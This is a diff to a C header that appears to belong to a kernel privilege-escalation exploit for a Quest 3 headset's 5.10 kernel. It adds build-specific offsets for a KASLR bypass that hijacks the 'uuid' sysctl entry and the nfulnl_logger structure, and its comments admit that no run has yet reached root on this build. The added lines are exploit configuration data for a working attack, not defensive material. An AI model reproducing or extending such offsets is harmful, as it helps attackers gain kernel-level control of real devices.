@@ -143,6 +143,19 @@
 // OK
 #define SLIDE_NFULNL_LOGGER_OFF 0x026eee50ULL //nfulnl_logger
 
+/* The perf-free KASLR slide. See the same block in
+ * quest3/global/5.10.240-g55be3759aea4/target-core510.h for what these are
+ * and why the `uuid` sysctl entry is the one taken over. Read out of this
+ * build's own image (out/quest3-ionstack/kernel-206.elf), not carried over:
+ * the two builds share .data and .text but not .rodata, so NAME_OFF differs
+ * (0x1cd0f01 here, 0x1cd0c86 there) while the other two agree.
+ *
+ * No run has ever reached root on this build and the device has OTA'd off
+ * it, so this route is untested here in a way it is not on 354. */
+#define SLIDE_RANDOM_UUID_DATA_OFF 0x027e64b8ULL   // &random_table[5].data (holds NULL)
+#define SLIDE_NFULNL_LOGGER_NAME_OFF 0x01cd0f01ULL // value of nfulnl_logger.name
+#define SLIDE_NFULNL_LOGGER_LOGFN_OFF 0x0142a9b0ULL // value of nfulnl_logger.logfn
+
 // PAGES
 #define LOCK_OFF 0x1000
 #define FOPS_OFF 0x2000
